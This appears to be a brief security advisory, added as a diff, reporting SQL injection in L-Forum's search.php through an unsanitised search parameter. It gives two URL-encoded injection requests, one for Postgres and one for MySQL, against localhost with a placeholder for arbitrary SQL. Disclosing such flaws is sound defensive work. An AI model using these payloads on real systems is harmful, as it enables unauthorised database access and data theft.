@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/5468/info
+
+Reportedly, L-Forum is vulnerable to SQL injection attacks. The vulnerability lies in the file 'search.php' 
+
+L-Forum does not properly sanitize user input that is used as part of the search parameter in the 'search.php' file. SQL code may be inserted into the requests and executed by the database server.
+
+Postgres:
+http://localhost/search.php?search=a%27%20order%20by%20time%20desc%3b%20[query]
+
+MySQL:
+http://localhost/search.php?search=a%25%27%20order%20by%20time%20desc%3b%20[query]
